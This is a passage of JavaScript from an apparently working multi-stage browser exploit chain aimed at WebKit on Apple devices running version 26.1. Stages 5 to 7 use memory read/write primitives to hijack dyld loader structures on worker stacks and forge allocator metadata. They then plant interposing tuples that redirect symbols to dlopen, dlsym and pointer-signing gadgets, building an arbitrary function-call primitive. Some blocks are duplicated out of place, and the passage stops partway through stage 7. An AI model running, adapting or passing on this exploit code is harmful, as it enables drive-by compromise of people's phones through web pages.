    const search_result = p.efficient_search(stack_top, stack_bottom, needle);
    postMessage(`[stage5] search_result:${hex(search_result)}`);
    const loader = search_result + structs.StackFrame_loader;
    postMessage(`[stage5] loader:${hex(loader)}`);
    // 0x140 entries, not 0x100: run 014753 baseline showed PRE-EXISTING interposing state
    // (buffer=0x1ee8705e0 size=9). free()'s store lands size=oldSize+0x100=0x109, so dyld would
    // scan 9 tuples past a 0x100-entry array -> size the array to cover it (zero tuples are inert:
    // Loader::interpose never matches replacee==0).
    const interposingTuples = new BigUint64Array(0x140 * 2);
    p.interposingTuples = interposingTuples;
    const interposingTuples_data_ptr = interposingTuples.data();
    postMessage(`[stage5] interposingTuples_data_ptr:${hex(interposingTuples_data_ptr)}`);
    const prev_metadata = new BigUint64Array(4);
    const prev_metadata_data_ptr = prev_metadata.data();
    p.prev_metadata = prev_metadata;
    p.prev_metadata_data_ptr = prev_metadata_data_ptr;
    postMessage(`[stage5] prev_metadata_data_ptr:${hex(prev_metadata_data_ptr)}`);
    // AllocationMetadata layout REQUIRED by 26.1's free->deallocate->insert path (disasm:
    // free 0x180126a18, deallocate 0x180126b44, owner-walk 0x18011eda8, insert 0x180122938;
    // crashes 094420/094830/105411 ALL at insert+0x34 = 0x18012296c):
    //  - free's store: [RS+0xb8] = chunk - (metadata[1]&~3) + oldBuf + 0x10. With chunk =
    //    attackerBuf+K and metadata[1] = (attackerBuf+K+0x10)|3 the store lands attackerBuf
    //    EXACTLY when oldBuf == 0 (which we now FORCE by zeroing RS+0xb8 first -- every device).
    //  - deallocate needs metadata[1] BIT0 set (else fatal 0x1801a08e4), runs the owner-walk,
    //    then CLEARS the flag bits (and ~3 @ 0x180126b70) BEFORE tail-calling insert -- so |3's
    //    bit1 does NOT protect insert (the "no coalesce at all" theory was wrong).
    //  - owner-walk terminates on a link that is 0 or has bit0 set: prev_metadata self-link|1
    //    stops it AND keeps a valid owner (plain self-link livelocks; a 0 link -> null owner ->
    //    the 15:19-15:23 freeze / 094504). prev_metadata[1]=1 terminates insert's ldrb.
    //  - insert+0x34 (the killer): x9 = metadata[1]&~3; x9 = [x9+8]; if that qword has BIT0 SET
    //    the merge-write is skipped; bit0 clear -> str x0,[x9] -> null/wild write (far=0x0 in
    //    094420/094830, far=0x3130414100000000 in 105411). The old fix SCANNED oldBuf's region for
    //    an odd qword (layout luck + ellekit dependency + the stock oldBuf=0 null-deref, 232351);
    //    the unified fix points x9 INTO our own tuples buffer with the odd qword PLANTED
    //    (tuples[35]=1n) -- deterministic, TPRO-safe (no pool writes), no scan.
    // Owner-walk termination (23B85): prev self-link WITH bit0 set (plain self-link livelocks).
    prev_metadata[0] = prev_metadata_data_ptr | 1n;
    prev_metadata[1] = 1n;
    // NO DIRECT POOL WRITES (2026-07-22, proven by 143949/144102.ips): RS+0xb8/+0xc0 live INSIDE
    // dyld's __TPRO_CONST pool -- any write64 to them faults KERN_PROTECTION_FAILURE on vphone AND
    // stock (TPRO is enforced pool-wide; reads are fine). The zero-first metadata idea is dead.
    // The store must be written BY DYLD (its apply self-RWs via os_thread_self_restrict_tpro_to_rw
    // -- the legitimate per-thread toggle), and the metadata must be satisfiable with pool READS
    // only:
    //  - stock (oldBuf==0): metadata[1]=1 -> X = meta[1]&~3 = 0 -> insert+0x34 takes its cbz skip
    //    (no deref at all); store = chunk - 0 + 0 + 0x10 = chunk, so chunk = attackerBuf-0x10 puts
    //    the store at attackerBuf exactly (attackerBuf = tuples+0x10, metadata at tuples[0],[1]).
    //  - vphone (oldBuf=ellekit): X = oldBuf+K+0x10 (cancels out of the store); insert's [X+8]
    //    needs an odd qword in oldBuf's region -- found by the K SCAN (reads only, TPRO-legal).
    const oldBuf = p.read64(p_InterposeTupleAll_buffer);
    const noTable = !(oldBuf > 0x100000000n && oldBuf < 0x210000000n);
    let attackerBuf, interpose_base, metadata_addr, metadata1_size;
    if (noTable) { //normal devices 
        attackerBuf = interposingTuples_data_ptr + 0x10n;
        interpose_base = 2;
        metadata_addr = interposingTuples_data_ptr;   // = attackerBuf - 0x10 (chunk = attackerBuf)
        metadata1_size = 1n;                           // X = 0 -> insert cbz skip (no deref)
        postMessage(`[stage5] oldBuf=0 -- STOCK metadata[1]=1 (insert cbz skip, no pool write); attackerBuf=+0x10`);
    } else { //Vphone ellekit trick 
        attackerBuf = interposingTuples_data_ptr;
        interpose_base = 0;
        const pageLeft = 0x4000n - (oldBuf & 0x3fffn) - 0x20n;
        const kMax = pageLeft < 0x2700n ? pageLeft : 0x2700n;
        let K = 0n;
        for (let k = 0x100n; k < kMax; k += 8n) {
            if ((p.read64(oldBuf + k + 0x18n) & 1n) === 1n) { K = k; break; }
        }
        if (K === 0n) { K = 0x200n; postMessage(`[stage5] WARN: no odd qword near oldBuf; fallback K=0x200 (131246 luck)`); }
        metadata_addr = interposingTuples_data_ptr + K;
        metadata1_size = (oldBuf + K + 0x10n) | 3n;
        postMessage(`[stage5] oldBuf=${hex(oldBuf)} K=${hex(K)} metadata_addr=${hex(metadata_addr)} flagQword=${hex(p.read64(oldBuf + K + 0x18n))}`);
    }
    p.attackerBuf = attackerBuf;   // expose to wakeViaMapRedirect's re-park hold (spins RS+0xb8 for it)
    p.write64(metadata_addr + 0n, p.prev_metadata_data_ptr);          // chunk link -> prev_metadata (valid owner)
    p.write64(metadata_addr + 8n, metadata1_size);                    // size field (bit0 = deallocate's gate)
    const metadata_data_ptr = metadata_addr;                            // alias for the vecSlot writes below
    const vecSlot = search_result - 0x818n;
    postMessage(`[stage5] vecSlot(x19+0x70)=${hex(vecSlot)}`);
    p.write64(vecSlot, p_InterposeTupleAll_buffer - 0x10n);        // lsl::Vector.allocator = dest-0x10
    p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n);            // .begin = forged AllocationMetadata
    p.write64(vecSlot + 0x10n, 0n);                                // .size = 0 (copy step is a no-op)
    p.write64(loader, p_InterposeTupleAll_buffer - 0x10n);
    p.write64(loader + 8n, metadata_data_ptr + 0x10n);

    //unlock for traditional loadobjcclass to laod 
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    atexitSilent();   // drop-proof (count==gen): no unlock in the process can wake worker1 yet
    postMessage("Atexit mutex state: " + p.read64(hex(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState)));
    // === wake worker1
    const w1tok = BigInt(worker.threadPort);
    const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
    p.write32le(lockAddr, w1tok);
    // (mutex stays SILENT here -- the arm moves to the mapredir, after the w1tok seed)
    initWakeTargets();
    // baseline BEFORE any wake: run-260719_013148 showed buffer non-zero from the first sample
    // (0x200ca05e0, dyld persistent region) -- pre-existing interposing state; the metadata delta
    // compensates (see above) so the store must land EXACTLY interposingTuples_data_ptr.
    postMessage(`[stage5] baseline: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} lock=${hex(p.read64(lockAddr) & 0xffffffffn)} atexit=${hex(p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState))} want buffer=${hex(attackerBuf)}`);
    __buf = p.read64(p.p_InterposeTupleAll_buffer);
    __w = p.read64(lockAddr) & 0xffffffffn;
    p.reestablishRead64();
    //const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
    const __ok = await fireWorkerWake(W1_WAKE_PATH, w1tok);
    if (!__ok) {
        postMessage(`[stage5] wake fire produced NO new image (${W1_WAKE_PATH} resident/bad) -- ABORTING attempt (a failed load poisons later loads; no chaining)`);
        postMessage({ type: 'pump_stop' });
        return false;
    } else {

        atexitWake();
        p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
        p.write64(p.runtimeStateLock + 0x20n, 0n);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.HOMEUI_cstring);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
        postMessage(`[stage5] going to load AVSpeechSynthesisVoice`);
        // arm the bundle-lock handoff on worker2 BEFORE the wake-load — close() blocks this thread
        await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
        postMessage(`[stage5] succeeded to load`);
    }
    // --- re-arm to PARK worker2, redirect the bundle to PerfPower ---
    atexitHold();   // park worker2's __cxa_atexit with a registered waiter (was bare 0x03)
    postMessage(`[stage5] Reparked`);
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
    p.write8(p.TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
    const worker2Path = p.makeCString("/System/Library/PrivateFrameworks/PerfPowerServicesReader.framework/PerfPowerServicesReader");
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, worker2Path.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, worker2Path.len);

    postMessage("FINISHED STAGE 5!!!");
}
async function stage6() {
    const {
        offsets
    } = p;
    postMessage('check_dlopen2');
    // COUNT-MATCH worker2 (2026-08-02): HomeUI's drop FIRES (gen flip) but worker2 never wakes --
    // the mapredir arm reused worker1's stage4 parkWord (0x202), advertising the WRONG psynch
    // generation for worker2's park. Capture worker2's ACTUAL park word now (worker2 is already
    // parked from trigger_dlopen_worker2, and this is before any of stage6's own atexit ops) so
    // the stage6 fire's count-matched arm matches worker2.
    {
        const __A2 = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
        const __old = p.parkWord;
        p.parkWord = p.read64(__A2);
        postMessage(`[stage6] worker2 parkWord=${hex(p.parkWord)} (worker1 was ${hex(__old)}); count-matched arm will use this`);
    }
    const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x22222222n);
    postMessage(`worker.thread: ${hex(worker.thread)}`);
    const stack_bottom = p.read64(worker.thread + 0x10n);
    worker.stack_bottom = stack_bottom;
    postMessage(`stack_bottom: ${hex(stack_bottom)}`);
    const stack_top = p.read64(worker.thread + 0x18n);
    worker.stack_top = stack_top;
    postMessage(`stack_top: ${hex(stack_top)}`);
    u64[0] = p.dlopen_from_lambda_ret;
    const needle = [u8[0], u8[1], u8[2], u8[3]];
    const search_result = p.efficient_search(stack_top, stack_bottom, needle);
    postMessage(`search_result:${hex(search_result)}`);
    const loader = search_result + 0x78n;
    postMessage(`loader:${hex(loader)}`);
    const metadata = new BigUint64Array(4);
    const metadata_data_ptr = metadata.data();
    postMessage(`metadata_data_ptr:${hex(metadata_data_ptr)}`);
    p.metadata1 = metadata;
    metadata[0] = p.prev_metadata_data_ptr;
    // Same 26.1 free->deallocate->insert path as stage5: store = chunk - (metadata[1]&~3) +
    // oldSize + 0x10 = metadata_data_ptr - (metadata_data_ptr-0xF0) + 9 + 0x10 = 0x109 (= old+0x100).
    // deallocate clears the flag bits BEFORE insert, so insert+0x34 reads [nextAddr+8] where
    // nextAddr = metadata[1]&~3 = metadata_data_ptr-0xF0. Plant an ODD qword there (JS heap,
    // writable -- legal) so insert's merge-write is skipped. metadata[1] bit0 = deallocate's gate.
    const nextAddr = metadata_data_ptr - 0xF0n;
    metadata[1] = (metadata_data_ptr + 0x10n - 0x100n) | 3n;
    p.write64(nextAddr + 0n, metadata_data_ptr);
    p.write64(nextAddr + 8n, 1n);
    postMessage(`[stage6] loader=${hex(loader)} sizeSlot=${hex(p.p_InterposeTupleAll_size)} prev_md=${hex(p.prev_metadata_data_ptr)}; hijack write`);
    // Same frame-offset fix as stage5: the forged vector must sit at lambda0's x19+0x70
    // (needle-0x818), consumed by the epilogue's guarded resize(0) -- needle+0x78 is never read.
    const vecSlot = search_result - 0x818n;
    postMessage(`[stage6] vecSlot(x19+0x70)=${hex(vecSlot)}`);
    p.write64(vecSlot, p.p_InterposeTupleAll_size - 0x10n);
    p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n);
    p.write64(vecSlot + 0x10n, 0n);
    p.write64(loader, p.p_InterposeTupleAll_size - 0x10n);
    p.write64(loader + 8n, metadata_data_ptr + 0x10n);
    postMessage(`[stage6] loader hijacked; rearm atexit/bundle/redirect  NSBundle=${hex(p.TextToSpeech_NSBundle)} rtsLock=${hex(p.runtimeStateLock)}`);
    armAtexitPass(); // keep the 0x100 waiter-count so the libGPUCompilerImplLazy load wakes worker2
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n); // zero the GUARD (+0), not the lock word (+0x20) -- see offset comment
    const gpuPath = p.makeCString(
        "/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImplLazy.dylib"
    );
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, gpuPath.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, gpuPath.len);
    postMessage(`[stage6] rearmed -> loadObjcClass(AVSpeechUtterance)`);
    // the rebuild self-check failed.
    // verify the primitives are correct before we trust them downstream
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.
atexitSilent();   // pass-through, no broadcast (held + waiter cleared, kernel flag kept)
p.silentLoad = true;

    await new Promise(r => setTimeout(r, 550));
    
    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
    await new Promise(r => setTimeout(r, 500));
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        p.addrof = rw.addrof;
        p.fakeobj = rw.fakeobj;
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
//    p.write32le(w2pthread + 0xf8n, BigInt(w2.threadPort));              // restore worker2's real token
p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the seed leftover before stage 7

    // verify the primitives are correct before we trust them downstream
    postMessage(`[stage6] loadObjcClass returned; building interpose tuples`);
    // Align the tuple writes with attackerBuf. On STOCK (noTable) devices the buffer-leg store
    // lands attackerBuf = tuples+0x10 (the metadata header occupies tuples[0..1]), so dyld reads
    // the interpose table from tuples[2]; writing the first tuple at tuples[0] leaves the MACaption
    // pivot invisible -> the caption carrier's re-dlsym is NOT interposed -> IIOLoadCMPhotoSymbols
    // never runs -> the gFunc globals stay 0 (the real-device fcall abort). vphone's ellekit path
    // has attackerBuf = tuples[0], so this is 0 there.
    const __tupleStart = Number((p.attackerBuf - p.interposingTuples.data()) / 8n);
    let interpose_index = __tupleStart;
    function interpose(ptr, val) {
        p.interposingTuples[interpose_index++] = val;
        p.interposingTuples[interpose_index++] = ptr;
    }
    // Tuple #1: the caption-BATTERY function MACaptionAppearanceGetTextEdgeStyle (NOT GetDisplayType:
    // on 26.1 the 2015-behavior ctor pins CaptionDisplayMode::Manual, so captionDisplayMode() never
    // calls the platform GetDisplayType -- that carrier was dead, run B proved it with zero globals).
    // captionsStyleSheetOverride() calls captionsTextEdgeCSS() on EVERY stylesheet build (triggered by
    // addTextTrack -> registerForCaptionPreferencesChangedCallbacks -> setInterestedInCaptionPreferenceChanges
    // -> 0s timer), and its garbage return is used as an integer enum -> benign. Its dlsym interposes
    // to IIOLoadCMPhotoSymbols, which re-resolves the 6 gFunc globals WITH our tuples -> GADGETS.
    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetTextEdgeStyle, offsets.ImageIO__IIOLoadCMPhotoSymbols);
    interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        p.addrof = rw.addrof;
        p.fakeobj = rw.fakeobj;
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
    postMessage(`[stage6] tuples built (index=${interpose_index}); spin until InterposeTupleAll.size==old+0x100 (bounded)`);
    // BOUNDED spin: an infinite spin hangs the worker -> WebKit watchdog reaps WebContent (WEBKIT
    // termination / device teardown). Poll a bounded number of times, logging buffer+size so we can
    // see whether worker1's fake-loader wrote the BUFFER and whether worker2 is writing the SIZE.
    // === wake worker2 (UNFUSED): same recipe as worker1's stage5 leg.
    // dyld writes the SIZE inside worker2's own dlopen_from epilogue off the hijacked loader.
    const w2tok = BigInt(worker.threadPort);
    const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
    p.write32le(lockAddr, w2tok);                                   // worker2's stale unlock is legal whenever it fires
    atexitPass();   // arm the wake: held clear + waiter kept so the next __cxa_atexit release broadcasts
    pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
    postMessage({ type: 'pump_start' });
    // pre-existing interposing state (run 014753: size=9) makes worker2's store land
    // oldSize+0x100, never exactly 0x100 -- compute the target from the CURRENT size.
    const oldSize = p.read64(p.p_InterposeTupleAll_size);
    const wantSize = oldSize + 0x100n;
    postMessage(`[stage6] wake-worker2 baseline: size=${hex(oldSize)} want size=${hex(wantSize)} (= old+0x100, exact 0x100 unreachable via the 4-aligned delta)`);
    let __spins = 0, __sz = 0n, __w = w2tok, __allSpentLogged = false;
    while (true) {
        __sz = p.read64(p.p_InterposeTupleAll_size);
        __w = p.read64(lockAddr) & 0xffffffffn;
        // 2026-08-02: break on the SIZE store ALONE. worker2's epilogue DID write old+0x100
        // (store landed), but its stale TT._lock unlock is tied to the dispatch_once gate block,
        // which HANGS on vphone -> lock!=w2tok never becomes true and waiting on it spins forever.
        // (Real device: worker2's gate completes ~0.13s after the store, so the lock clears there.)
        if (__sz === wantSize) break;                                  // dyld wrote +0x100 (worker2's store landed)
        if (++__spins % 250000 === 0) {
            p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing
            const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
            if (__as === 0n) atexitPass();  // re-arm only from 0 (don't clobber a live 0x103 acquisition)
            // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
            // Fallback every 3M spins: the plant-target sequencer (cursor continues from stage5).
            if (__spins === 250000) {
                // worker2's wake: the stage5 EARLY-OUT guards (leftover store + flipped atexit gen)
                // are worker1-stale here -> skip them; use spare[1] (0x44444444, fresh bitmap) and
                // REUSE the known-good borrow (a rotated candidate, idx4, crashed the spare's gate).
                // wantSize makes the mapredir store-sync wait for worker2's SIZE store (not worker1's
                // leftover buffer) so the post-store freeze can't block worker2's re-acquire.
                await fireWorkerWake(W2_WAKE_PATH, w2tok, { skipEarlyOut: true, spareIdx: 1, wantSize });
            } else if (__spins % 3000000 === 0) {
                const t = nextWakeTarget();
                if (t) await fireWakeTarget(t, lockAddr, w2tok);
                else {
                    if (!__allSpentLogged) { __allSpentLogged = true; postMessage(`[stage6] ALL wake targets spent -- pump-only from here (lldb if this persists)`); }
                    if (__spins % 3000000 === 0) pumpSoftlink();
                }
            }
            if (__spins % 1000000 === 0) postMessage(`[stage6] wake-worker2 ${__spins}: size=${hex(__sz)} buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} lock=${hex(__w)} atexit=${hex(__as)} (want size=${hex(wantSize)}; lock=${hex(__w)} may never clear on vphone)`);
            if (__spins >= 20000000) {
                postMessage(`[stage6] WAKE TIMEOUT -- no broadcast reached worker2 (seed left in place; crash-safe)`);
                postMessage({ type: 'pump_stop' });
                return;
            }
        }
    }
    postMessage({ type: 'pump_stop' });
    postMessage(`[stage6] spin done (size=${hex(p.read64(p.p_InterposeTupleAll_size))}); reading softlink globals`);
    dumpWorkerStack(worker, 'worker2-post-interpose');   // where is worker2's dlopen parked now?
    // DUMP the interposingTuplesAll table right after the size store lands: verify OUR 8 tuples are
    // correctly in RuntimeState for Loader::interpose (compares tuple.replacee [i+1] to the dlsym
    // address, returns tuple.replacement [i]). If the buffer/layout is wrong, that's why the
    // globals never become gadgets.
    {
        const buf = p.read64(p.p_InterposeTupleAll_buffer);
        const sz = p.read64(p.p_InterposeTupleAll_size);
        const a = p.read64(buf), b = p.read64(buf + 8n), c = p.read64(buf + 0x10n), d = p.read64(buf + 0x18n);
        postMessage(`[diag2] interposeAll buf=${hex(buf)} size=${hex(sz)} | rep[0]=${hex(a)} rep_ee[1]=${hex(b)} rep[2]=${hex(c)} rep_ee[3]=${hex(d)}`);
    }
    const softLinkGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
    const softLinkTextEdge = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle);
    postMessage(`[stage6] softLinkDisplayType=${hex(softLinkGetDisplayType)} softLinkTextEdge=${hex(softLinkTextEdge)} (want init wrapper 0x1a1056008+slide = battery virgin); read PAL_getPKContactClass`);
    const paciza_PAL_initPKContact = p.read64(offsets.WebCore__PAL_getPKContactClass);
    postMessage(`[stage6] paciza_PAL_initPKContact=${hex(paciza_PAL_initPKContact)}; write PKContact patch`);
    // NOTE: the DDDFA slot is NO LONGER patched with the MACaption init wrapper here. The 26.1
    // detector caller bounds-traps on the wrapper's garbage return (crash 071617). Resolution is
    // now driven by the page's CAPTION carrier (sign_pointers case); stage7 re-patches the slot
    // with paciza_security_invoker_1/2 per fcall (26.1 trigger redesign, §5o).
    p.write64(offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
    p.write64(offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
    p.write64(offsets.WebCore__initPKContact_value, 0n);
    // Force IIOLoadCMPhotoSymbols to re-resolve the CMPhoto globals WITH our tuples installed.
    // The globals + the TextEdgeStyle init-wrapper once token (0x1eb083d48, ipsw dyld softlinks)
    // resolved BEFORE the tuples (plain dlsym), so they hold REAL CMPhoto pointers and the
    // interpose never matched (15:54 symptom). Reset the once token to 0 so the page's CAPTION
    // carrier (addTextTrack -> caption stylesheet build) makes the init wrapper re-dlsym
    // MACaptionAppearanceGetTextEdgeStyle -> interpose -> IIOLoadCMPhotoSymbols (NO internal
    // gate; re-resolves unconditionally), and zero the six gFunc globals so that re-resolution
    // repopulates them with GADGET addresses (each CMPhoto dlsym interposed: invoker, Security
    // block_invokes, dlopen, dlsym, signPointer).
    p.write64(offsets.WebCore__initMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle_once, 0n);
    for (const g of [offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt,
                     offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage,
                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage,
                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation,
                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata,
                     offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif]) {
        p.write64(g, 0n);
    }
    postMessage(`[stage6] posting sign_pointers`);
    self.postMessage({
        type: 'sign_pointers'
    });
}async function stage7() {
    const {
        offsets
    } = p;
    // (2026-07-21 gate-free redesign) the ENTIRE fcall setup lives in setupFcall() (run in stage5's
    // post-wake with per-call gSecurityd swap/restore). This stage is now JUST the self-test.
    // Diag re-reads of the gadget globals (resolved by the stage5 caption carrier):
    postMessage(`paciza_invoker: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt))}`);
    postMessage(`paciza_security_invoker_1: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage))}`);
    postMessage(`paciza_security_invoker_2: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage))}`);
    postMessage(`paciza_dlopen: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation))}`);
    postMessage(`paciza_dlsym: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata))}`);
    postMessage(`paciza_signPointer: ${hex(p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif))}`);
    // fcall setup (2026-08-02): setupFcall() was defined but never CALLED in the gate-free flow --
    // p.fcallReady / slow_dlopen / slow_dlsym only exist after it runs, and it needs the caption
    // carrier to have resolved the gFunc globals (which stage6's sign_pointers just did). It returns
    // false (and leaves fcallReady unset) if the invoker gadget didn't land -> abort below.
    // PRE-SETUP LOG (2026-08-02): slide + the 6 gadget globals' raw and UNSLID (noPAC - slide)
    // values right before setupFcall validates them -- pins the real device's slide and confirms
    // which addresses the caption carrier actually resolved into the globals.
    try {
        p.reestablishRead64();
        const __G = [
            ['invoker', offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt],
            ['sec1', offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage],
            ['sec2', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage],
            ['dlopen', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation],
            ['dlsym', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata],
            ['sign', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif],
        ];
        postMessage(`[stage7] pre-setup slide=${hex(p.slide)} | ` + __G.map(([n, o]) => `${n}=${hex(p.read64(o))}->${hex(noPAC(p.read64(o)) - p.slide)}`).join(' '));
    } catch (e) { postMessage(`[stage7] pre-setup LOG ERR ${e && (e.message || e)}`); }
    await setupFcall();
    if (!p.fcallReady) { postMessage('[stage7] ABORT: fcall not ready (setupFcall did not run?)'); return; }
    const slow_dlopen = p.slow_dlopen, slow_dlsym = p.slow_dlsym;
    // MARKER TEST (2026-08-02, real-device trigger debug): one raw fcall with pc=dlopen and a
    // guaranteed-loadable path. If the detector scan reaches the softlink slot, the gadget loads
    // x0=[scanner+0x28] (our path) and calls dlopen -> non-zero handle lands in OUR result slot
    // (the poll resolves it). If the slot is never invoked, the sentinel survives and the poll
    // times out -> 0xdeaddead. (signPointer was avoided: it hangs in the scan context.)
    try {
        const __mp = p.makeCString('/usr/lib/libSystem.B.dylib');
        const __m = await p.slow_fcall_1(p.paciza_dlopen, __mp.ptr, 0n, 0n);
        postMessage(`[stage7] MARKER TEST dlopen('/usr/lib/libSystem.B.dylib') result=${hex(__m)} ${(__m !== 0xdeaddeadn && __m !== 0n) ? '-> GADGET REACHED + dlopen OK' : (__m === 0xdeaddeadn ? '-> SLOT NEVER INVOKED (scan not reaching the gadget)' : '-> gadget reached but dlopen returned 0')}`);
    } catch (e) { postMessage(`[stage7] MARKER TEST ERR ${e && (e.message || e)}`); }

    // --- fcall self-test: prove the primitive end-to-end with observable, pre-verified results ---
    // fcall self-test: prove the primitive end-to-end with observable, pre-verified results.
    // NOTE: the lock-free signPointer probe was REMOVED -- it hangs in the nested detector-scan
    // context (dyld-internal, not safe to call there). Test slow_dlopen directly (API lock is free).
    postMessage(`[stage7] setup done; fcall self-test: slow_dlopen libsystem_malloc...`);
    // liveness instrumentation: if the process dies/hangs mid-self-test, the tick trail shows how
    // long the WORKER stayed alive after each fcall post (distinguishes "main thread hung in the
    // fcall" from "whole process died instantly").
    let __t0 = Date.now();
    let __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
    const malloc_handle = await slow_dlopen('/usr/lib/system/libsystem_malloc.dylib', 0n);
    clearInterval(__tick);
